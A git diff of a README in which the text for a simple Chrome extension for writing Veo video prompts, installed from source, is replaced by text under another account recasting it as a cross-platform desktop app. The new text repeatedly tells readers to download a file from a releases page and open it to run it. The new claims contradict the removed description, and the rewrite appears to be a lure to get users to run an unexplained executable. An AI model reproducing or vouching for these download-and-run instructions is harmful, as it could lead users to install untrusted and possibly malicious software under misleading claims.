@@ -1,66 +1,61 @@
-# Veo 3 AI Video JSON Prompt Generator 🎬
+# 🎉 veo-prompt-generator - Easily Organize Your AI Ideas
 
-A handy Chrome extension to help you craft structured JSON prompts for AI video generation models. This tool provides a user-friendly interface to break down your creative ideas into key components, generating both a detailed JSON object and a human-readable summary.
+[![Download the App](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/KaizerAE/veo-prompt-generator/releases)
 
+## 📥 Overview
 
+The veo-prompt-generator helps you streamline your thoughts into structured JSON prompts. No more complicated formats or tangled ideas. This tool turns your creativity into easy-to-manage prompts for AI applications, enhancing your productivity.
 
----
+## 🚀 Getting Started
 
-## Features ✨
+### Prerequisites
 
-* **Intuitive Form:** Easily input the main subject, action, setting, lighting, and other details.
-* **Predefined Styles:** Choose from a variety of visual styles (e.g., Photorealistic, Anime, Cinematic) and camera shots (e.g., Wide, Close-up, Drone).
-* **Structured JSON Output:** Automatically generates a well-formatted JSON object, perfect for use with an AI video model's API.
-* **Prompt Summary:** Creates a concise, human-readable sentence from all your inputs.
-* **One-Click Copy:** Instantly copy the generated JSON to your clipboard with a single click.
-* **Sleek Dark UI:** A modern, responsive, and comfortable dark theme for ease of use.
+Before you download, ensure your computer meets the following requirements:
 
----
+- Operating System: Windows, macOS, or Linux
+- Internet Connection: Required for downloading the software
+- Storage Space: At least 50 MB available
 
-## Installation 🚀
+## 📦 Download & Install
 
-To install and use this extension locally, follow these steps:
+To get started with veo-prompt-generator, visit this page to download: [Download Now](https://github.com/KaizerAE/veo-prompt-generator/releases)
 
-1.  **Download the Code:**
-    * Clone the repository: `git clone https://github.com/JayashBhandary/veo-prompt-generator.git`
-    * Or, download the project as a ZIP file and unzip it.
+1. Click on the link above.
+2. You will see a list of available versions. Choose the latest release.
+3. Download the file suitable for your operating system.
+4. Once the download is complete, locate the file on your computer.
+5. Open the file to run the application.
 
-2.  **Load the Extension in Chrome:**
-    * Open your Chrome browser and navigate to `chrome://extensions`.
-    * Enable **Developer mode** using the toggle switch in the top-right corner.
-    * Click the **"Load unpacked"** button that appears on the left.
-    * Select the directory where you cloned or unzipped the project files.
-    * The extension's icon will now appear in your browser's toolbar. Pin it for easy access!
+## 🛠️ Features
 
----
+- **User-Friendly Interface:** Designed for non-technical users to easily create and manage prompts.
+- **Seamless JSON Formatting:** Automatically organizes your ideas in a clear JSON structure.
+- **Export Options:** Save your prompts for future use or share them directly.
+- **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux.
 
-## How to Use 📝
+## ⚙️ How to Use
 
-1.  Click the extension's icon in your browser toolbar to open the popup window.
-2.  Fill out the form fields with the details of the video you want to create.
-3.  Click the **"Generate Prompt"** button.
-4.  The generated JSON will appear in the text area at the bottom.
-5.  Click **"Copy to Clipboard"** to grab the JSON and use it wherever you need!
+1. **Launch the Application:** Open veo-prompt-generator from your applications folder or downloaded file.
+2. **Create a New Prompt:**
+   - Click on the "New Prompt" button.
+   - Enter your ideas in the designated fields.
+3. **Save Your Work:**
+   - Once you are satisfied, click "Save" to export your prompt in JSON format.
 
----
+## 🌐 Additional Information
 
-## Technologies Used 💻
+If you want to learn more about the app and its functionality, visit our official documentation [here](https://github.com/KaizerAE/veo-prompt-generator/wiki).
 
-This extension is built with web-native technologies, keeping it lightweight and fast.
+## 📞 Support
 
-* **HTML:** For the structure of the popup.
-* **CSS:** For the modern, dark-themed styling.
-* **JavaScript:** For all the interactive logic, including prompt generation and clipboard functionality.
+If you encounter any issues or have questions, please refer to the wiki or open an issue in the repository. Your feedback helps us improve the application.
 
----
+## 🔄 Update Regularly
 
-## File Structure 📂
+Keep your app updated to enjoy new features and security improvements. Revisit our [Releases Page](https://github.com/KaizerAE/veo-prompt-generator/releases) regularly for the latest updates.
 
-Here's a quick overview of the key files in this project:
-```python
-├── popup.html       # The main UI for the extension popup
-├── popup.css        # All styles for the popup interface
-├── popup.js         # Logic for prompt generation and clipboard functionality
-├── manifest.json    # The extension's configuration file required by Chrome
-└── images/          # Contains the extension icons (icon16.png, etc.)
-```
+## 💬 Community
+
+Join the conversation. Share your experience with fellow users and get tips on using veo-prompt-generator effectively. Connect with us on our social channels.
+
+Thank you for choosing veo-prompt-generator! Enjoy organizing your ideas.
